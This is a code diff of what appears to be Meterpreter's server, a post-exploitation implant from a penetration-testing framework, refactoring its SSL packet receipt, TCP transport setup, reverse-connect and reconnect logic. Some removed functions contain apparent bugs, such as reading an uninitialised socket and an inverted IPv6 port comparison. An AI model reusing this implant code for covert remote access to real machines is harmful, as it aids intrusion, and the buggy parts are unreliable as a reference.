-					dprintf("[PACKET] receive payload of length %d failed with error code %d. SSLerror=%d\n", payloadLength, bytesRead, SSL_get_error(ctx->ssl, bytesRead));
-					SetLastError(ERROR_NOT_FOUND);
-				}
-
-				break;
-			}
-
-			payloadBytesLeft -= bytesRead;
-		}
-
-		// Didn't finish?
-		if (payloadBytesLeft)
-		{
-			break;
-		}
-
-		// Allocate a packet structure
-		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
-		{
-			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
-			break;
-		}
-
-		memset(localPacket, 0, sizeof(Packet));
-
-		// If the connection has an established cipher and this packet is not
-		// plaintext, decrypt
-		if ((crypto = remote_get_cipher(remote)) &&
-			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
-			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
-		{
-			ULONG origPayloadLength = payloadLength;
-			PUCHAR origPayload = payload;
-
-			// Decrypt
-			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
-			{
-				SetLastError(res);
-				break;
-			}
-
-			// We no longer need the encrypted payload
-			free(origPayload);
-		}
-
-		localPacket->header.length = header.length;
-		localPacket->header.type = header.type;
-		localPacket->payload = payload;
-		localPacket->payloadLength = payloadLength;
-
-		*packet = localPacket;
-
-		SetLastError(ERROR_SUCCESS);
-
-	} while (0);
-
-	res = GetLastError();
-
-	// Cleanup on failure
-	if (res != ERROR_SUCCESS)
-	{
-		if (payload)
-		{
-			free(payload);
-		}
-		if (localPacket)
-		{
-			free(localPacket);
-		}
-	}
-
-	lock_release(remote->lock);
-
-	return res;
 }
 
 /*!
@@ -852,7 +412,7 @@ static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
  * @param remote Pointer to the remote endpoint for this server connection.
  * @returns Indication of success or failure.
  */
-static BOOL server_dispatch_tcp(Remote * remote, THREAD* dispatchThread)
+static BOOL server_dispatch(Remote * remote, THREAD* dispatchThread)
 {
 	BOOL running = TRUE;
 	LONG result = ERROR_SUCCESS;
@@ -872,7 +432,7 @@ static BOOL server_dispatch_tcp(Remote * remote, THREAD* dispatchThread)
 		}
 		result = server_socket_poll(remote, 500000);
 		if (result > 0) {
-			result = packet_receive_via_ssl(remote, &packet);
+			result = remote->transport->packet_receive(remote, &packet);
 			if (result != ERROR_SUCCESS) {
 				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
 				break;
@@ -897,185 +457,12 @@ static BOOL server_dispatch_tcp(Remote * remote, THREAD* dispatchThread)
 	return result;
 }
 
-/*!
- * @brief Destroy the TCP transport.
- * @param transport Pointer to the TCP transport to reset.
- */
-static void transport_destroy_tcp(Remote* remote)
-{
-	if (remote && remote->transport && remote->transport->type == METERPRETER_TRANSPORT_SSL)
-	{
-		dprintf("[TRANS TCP] Destroying tcp transport for url %S", remote->transport->url);
-		SAFE_FREE(remote->transport->url);
-		SAFE_FREE(remote->transport->ctx);
-		SAFE_FREE(remote->transport);
-	}
-}
-
-/*!
- * @brief Configure the TCP connnection. If it doesn't exist, go ahead and estbalish it.
- * @param transport Pointer to the TCP transport to reset.
- */
-static void transport_reset_tcp(Transport* transport)
-{
-	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
-	{
-		TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
-		if (ctx->fd)
-		{
-			closesocket(ctx->fd);
-		}
-		ctx->fd = 0;
-	}
-}
-
-/*!
- * @brief Attempt to determine if the stager connection was a bind or reverse connection.
- * @param ctx Pointer to the current \c TcpTransportContext.
- * @param sock The socket file descriptor passed in to metsrv.
- * @remark This function always "succeeds" because the fallback case is reverse_tcp.
- */
-static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
-{
-	// if we get here it means that we've been given a socket from the stager. So we need to stash
-	// that in our context. Once we've done that, we need to attempt to infer whether this conn
-	// was created via reverse or bind, so that we can do the same thing later on if the transport
-	// fails for some reason.
-	SOCKET listenSocket;
-
-	ctx->fd = sock;
-
-	// default to reverse socket
-	ctx->bound = FALSE;
-
-	// for sockets that were handed over to us, we need to persist some information about it so that
-	// we can reconnect after failure. To support this, we need to first get the socket information
-	// which gives us addresses and port information
-	ctx->sock_desc_size = sizeof(ctx->sock_desc);
-	if (getsockname(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size) != SOCKET_ERROR)
-	{
-#ifdef DEBUGTRACE
-		if (ctx->sock_desc.ss_family == AF_INET)
-		{
-			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
-		}
-		else
-		{
-			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
-		}
-#endif
-	}
-	else
-	{
-		dprintf("[STAGED] getsockname failed: %u (%x)", GetLastError(), GetLastError());
-	}
-
-	// then, to be horrible, we need to figure out the direction of the connection. To do this, we will
-	// Loop backwards from our current socket FD number
-	for (int i = 1; i <= 64; ++i)
-	{
-		// Windows socket handles are always multiples of 4 apart.
-		listenSocket = ctx->fd - i;
-
-		dprintf("[STAGED] Checking socket fd %u", listenSocket);
-
-		BOOL isListening = FALSE;
-		int isListeningLen = sizeof(isListening);
-		if (getsockopt(listenSocket, SOL_SOCKET, SO_ACCEPTCONN, (char*)&isListening, &isListeningLen) == SOCKET_ERROR)
-		{
-			dprintf("[STAGED] Couldn't get socket option to see if socket was listening: %u %x", GetLastError(), GetLastError());
-			continue;
-		}
-
-		if (!isListening)
-		{
-			dprintf("[STAGED] Socket appears to NOT be listening");
-			continue;
-		}
-
-		// try to get details of the socket address
-		struct sockaddr_storage listenStorage;
-		int listenStorageSize = sizeof(listenStorage);
-		if (getsockname(listenSocket, (struct sockaddr*)&listenStorage, &listenStorageSize) == SOCKET_ERROR)
-		{
-			vdprintf("[STAGED] Socket fd %u invalid: %u %x", listenSocket, GetLastError(), GetLastError());
-			continue;
-		}
-
-		// on finding a socket, see if it matches the family of our current socket
-		if (listenStorage.ss_family != ctx->sock_desc.ss_family)
-		{
-			vdprintf("[STAGED] Socket fd %u isn't the right family, it's %u", listenSocket, listenStorage.ss_family);
-			continue;
-		}
-
-		// if it's the same, and we are on the same local port, we can assume that there's a bind listener
-		if (listenStorage.ss_family == AF_INET)
-		{
-			if (((struct sockaddr_in*)&listenStorage)->sin_port == ((struct sockaddr_in*)&ctx->sock_desc)->sin_port)
-			{
-				dprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
-				ctx->bound = TRUE;
-				break;
-			}
-			vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
-		}
-		else if (listenStorage.ss_family == AF_INET6)
-		{
-			if (((struct sockaddr_in6*)&listenStorage)->sin6_port != ((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port)
-			{
-				dprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
-				ctx->bound = TRUE;
-				break;
-			}
-			vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
-		}
-	}
-
-	if (ctx->bound)
-	{
-		// store the details of the listen socket so that we can use it again
-		ctx->sock_desc_size = sizeof(ctx->sock_desc);
-		getsockname(listenSocket, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
-
-		// the listen socket that we have been given needs to be tidied up because
-		// the stager doesn't do it
-		closesocket(listenSocket);
-	}
-	else
-	{
-		// if we get here, we assume reverse_tcp, and so we need the peername data to connect back to
-		vdprintf("[STAGED] Connection appears to be a reverse connection");
-		ctx->sock_desc_size = sizeof(ctx->sock_desc);
-		getpeername(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
-#ifdef DEBUGTRACE
-		if (ctx->sock_desc.ss_family == AF_INET)
-		{
-			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
-		}
-		else
-		{
-			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
-		}
-#endif
-	}
-}
-
-/*!
- * @brief Configure the TCP connnection. If it doesn't exist, go ahead and estbalish it.
- * @param remote Pointer to the remote instance with the TCP transport details wired in.
- * @param sock Reference to the original socket FD passed to metsrv.
- * @return Indication of success or failure.
- */
-static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
+BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
 {
 	DWORD result = ERROR_SUCCESS;
 	size_t charsConverted;
 	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
 	char* asciiUrl = remote->transport->url;
-
-	remote->transport->start_time = current_unix_timestamp();
-	remote->transport->comms_last_packet = current_unix_timestamp();
 
 	if (strncmp(asciiUrl, "tcp", 3) == 0)
 	{
@@ -1090,8 +477,7 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 			*(pScopeId - 1) = '\0';
 			*(pPort - 1) = '\0';
 			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
-			result = reverse_tcp6(pHost, pPort, atol(pScopeId), remote->transport->timeouts.retry_total,
-				remote->transport->timeouts.retry_wait, remote->transport->expiration_end, &ctx->fd);
+			result = reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, &ctx->fd);
 		}
 		else
 		{
@@ -1108,64 +494,21 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 			{
 				*(pPort - 1) = '\0';
 				dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
-				result = reverse_tcp4(pHost, usPort, remote->transport->timeouts.retry_total, remote->transport->timeouts.retry_wait,
-					remote->transport->expiration_end, &ctx->fd);
-			}
-		}
-	}
-	else if (ctx->sock_desc_size > 0)
-	{
-		dprintf("[STAGED] Attempted to reconnect based on inference from previous staged connection (size %u)", ctx->sock_desc_size);
-
-		// check if we should do bind() or reverse()
-		if (ctx->bound)
-		{
-			dprintf("[STAGED] previous connection was a bind connection");
-			SOCKET listenSocket = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
-
-			result = bind_tcp_run(listenSocket, (struct sockaddr*)&ctx->sock_desc, ctx->sock_desc_size, &ctx->fd);
-		}
-		else
-		{
-			dprintf("[STAGED] previous connection was a reverse connection");
-			ctx->fd = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);
-
-			result = reverse_tcp_run(ctx->fd, (struct sockaddr*)&ctx->sock_desc, ctx->sock_desc_size,
-				remote->transport->timeouts.retry_total, remote->transport->timeouts.retry_wait,
-				remote->transport->expiration_end);
-
-			if (result != ERROR_SUCCESS)
-			{
-				ctx->fd = 0;
+				result = reverse_tcp4(pHost, usPort, iRetryAttempts, &ctx->fd);
 			}
 		}
 	}
 	else
 	{
-		// if we get here it means that we've been given a socket from the stager. So we need to stash
-		// that in our context. Once we've done that, we need to attempt to infer whether this conn
-		// was created via reverse or bind, so that we can do the same thing later on if the transport
-		// fails for some reason.
-		infer_staged_connection_type(ctx, sock);
+		// assume that we have been given a valid socket given that there's no stageless information
+		ctx->fd = socket;
 	}
 
-	if (result != ERROR_SUCCESS) {
-		return FALSE;
-	}
 	// Do not allow the file descriptor to be inherited by child processes
 	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
 
 	dprintf("[SERVER] Flushing the socket handle...");
 	server_socket_flush(remote);
-
-	// TODO: remove this when stageless stuff happens.
-	// if we've just "reconnected" then we're going to flush
-	// the socket a second time beacuse the second stage is
-	// coming down and we don't want it!
-	if (ctx->sock_desc_size > 0)
-	{
-		server_socket_flush(remote);
-	}
 
 	dprintf("[SERVER] Initializing SSL...");
 	if (server_initialize_ssl(remote))
@@ -1184,95 +527,60 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 	return TRUE;
 }
 
-/*!
- * @brief Get the socket from the transport (if it's TCP).
- * @param transport Pointer to the TCP transport containing the socket.
- * @return The current transport socket FD, if any, or zero.
- */
-static SOCKET transport_get_socket_tcp(Transport* transport)
+void transport_destroy_tcp(Remote* remote)
 {
-	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
+	if (remote && remote->transport)
 	{
-		return ((TcpTransportContext*)transport->ctx)->fd;
+		dprintf("[TRANS TCP] Destroying tcp transport for url %S", remote->transport->url);
+		SAFE_FREE(remote->transport->url);
+		SAFE_FREE(remote->transport);
 	}
-
-	return 0;
 }
 
-/*!
- * @brief Creates a new TCP transport instance.
- * @param url URL containing the transport details.
- * @param timeouts The timeout values to use for this transport.
- * @return Pointer to the newly configured/created TCP transport instance.
- */
-Transport* transport_create_tcp(char* url, TimeoutSettings* timeouts)
+Transport* transport_create_tcp(char* url)
 {
 	Transport* transport = (Transport*)malloc(sizeof(Transport));
 	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
 
-	dprintf("[TRANS TCP] Creating tcp transport for url %S", url);
+	dprintf("[TRANS TCP] Creating tcp transport for url %s", url);
 
 	memset(transport, 0, sizeof(Transport));
 	memset(ctx, 0, sizeof(TcpTransportContext));
 
-	memcpy(&transport->timeouts, timeouts, sizeof(transport->timeouts));
-
-	transport->type = METERPRETER_TRANSPORT_SSL;
 	transport->url = strdup(url);
+	transport->packet_receive = packet_receive_via_ssl;
 	transport->packet_transmit = packet_transmit_via_ssl;
 	transport->transport_init = configure_tcp_connection;
 	transport->transport_deinit = server_destroy_ssl;
 	transport->transport_destroy = transport_destroy_tcp;
-	transport->transport_reset = transport_reset_tcp;
-	transport->server_dispatch = server_dispatch_tcp;
-	transport->get_socket = transport_get_socket_tcp;
+	transport->server_dispatch = server_dispatch;
+	transport->get_socket = tcp_transport_get_socket;
 	transport->ctx = ctx;
-	transport->expiration_end = current_unix_timestamp() + transport->timeouts.expiry;
-	transport->start_time = current_unix_timestamp();
-	transport->comms_last_packet = current_unix_timestamp();
+	transport->type = METERPRETER_TRANSPORT_SSL;
 
 	return transport;
 }
 
-/*!
- * @brief Create a new transport based on the given metsrv configuration.
- * @param config Pointer to the metsrv configuration block.
- * @param stageless Indication of whether the configuration is stageless.
- * @param fd The socket descriptor passed to metsrv during intialisation.
- */
-static Transport* transport_create(MetsrvConfigData* config, BOOL stageless)
+Transport* transport_create(char* transport, char* url)
 {
 	Transport* t = NULL;
-	char* transport = config->transport + TRANSPORT_ID_OFFSET;
-	char* url = config->url + (stageless ? 1 : 0);
-
 	dprintf("[TRANSPORT] Type = %s", transport);
 	dprintf("[TRANSPORT] URL = %s", url);
 
-	if (strcmp(transport, "SSL") == 0)
+	if (strcmp(transport, "TRANSPORT_SSL") == 0)
 	{
-		t = transport_create_tcp(url, &config->timeouts.values);
+		t = transport_create_tcp(url);
 	}
 	else
 	{
-		// one day we'll have http(s)
-	}
-
-	if (t) {
-		dprintf("[TRANSPORT] Comms timeout: %u %08x", t->timeouts.comms, t->timeouts.comms);
-		dprintf("[TRANSPORT] Session timeout: %u %08x", t->timeouts.expiry, t->timeouts.expiry);
-		dprintf("[TRANSPORT] Session expires: %u %08x", t->expiration_end, t->expiration_end);
-		dprintf("[TRANSPORT] Retry total: %u %08x", t->timeouts.retry_total, t->timeouts.retry_total);
-		dprintf("[TRANSPORT] Retry wait: %u %08x", t->timeouts.retry_wait, t->timeouts.retry_wait);
+		dprintf("[TRANSPORT] not supported");
 	}
 
 	return t;
 }
 
-/*!
- * @brief Setup and run the server. This is called from Init via the loader.
- * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
- * @return Meterpreter exit code (ignored by the caller).
+/*
+ * Setup and run the server. This is called from Init via the loader.
  */
 DWORD server_setup(SOCKET fd)
 {
@@ -1299,9 +607,6 @@ DWORD server_setup(SOCKET fd)
 		goto out;
 	}
 
-	// Set up the transport creation function pointers.
-	remote->trans_create_tcp = transport_create_tcp;
-
 	// Store our thread handle
 	remote->server_thread = dispatchThread->handle;
 
@@ -1310,55 +615,25 @@ DWORD server_setup(SOCKET fd)
 
 	// allocate the "next transport" information
 	dprintf("[SERVER] creating transport");
-	remote->next_transport = transport_create(&global_config, FALSE);
+	remote->next_transport = transport_create(global_meterpreter_transport + 12, global_meterpreter_url);
 
-	while (remote->next_transport)
-	{
-		// Work off the next transport
+	while (remote->next_transport) {
 		remote->transport = remote->next_transport;
-
-		if (remote->transport->transport_init)
-		{
-			dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport->transport_init);
-			// Each transport has its own set of retry settings and each should honour
-			// them individually.
-			if (!remote->transport->transport_init(remote, fd))
-			{
-				dprintf("[SERVER] transport initialisation failed.");
-
-				// when we have a list of transports, we'll iterate to the next one.
-				break;
-			}
-		}
-
-		// once initialised, we'll clean up the next transport so that we don't try again
 		remote->next_transport = NULL;
 
-		dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
-		DWORD dispatchResult = remote->transport->server_dispatch(remote, dispatchThread);
+		dprintf("[SERVER] initialising transport 0x%p", remote->transport->transport_init);
+		if (remote->transport->transport_init && !remote->transport->transport_init(remote, fd)) {
+			break;
+		}
 
-		if (remote->transport->transport_deinit)
-		{
+		dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
+		remote->transport->server_dispatch(remote, dispatchThread);
+
+		if (remote->transport->transport_deinit) {
 			remote->transport->transport_deinit(remote);
 		}
 
-		// If the transport mechanism failed, then we should loop until we're able to connect back again.
-		// But if it was successful, and this is a valid exit, then we should clean up and leave.
-		if (dispatchResult == ERROR_SUCCESS)
-		{
-			remote->transport->transport_destroy(remote);
-		}
-		else
-		{
-			// try again!
-			if (remote->transport->transport_reset)
-			{
-				remote->transport->transport_reset(remote->transport);
-			}
-
-			// when we have a list of transports, we'll iterate to the next one (perhaps?)
-			remote->next_transport = remote->transport;
-		}
+		remote->transport->transport_destroy(remote);
 	}
 
 	dprintf("[SERVER] Deregistering dispatch routines...");
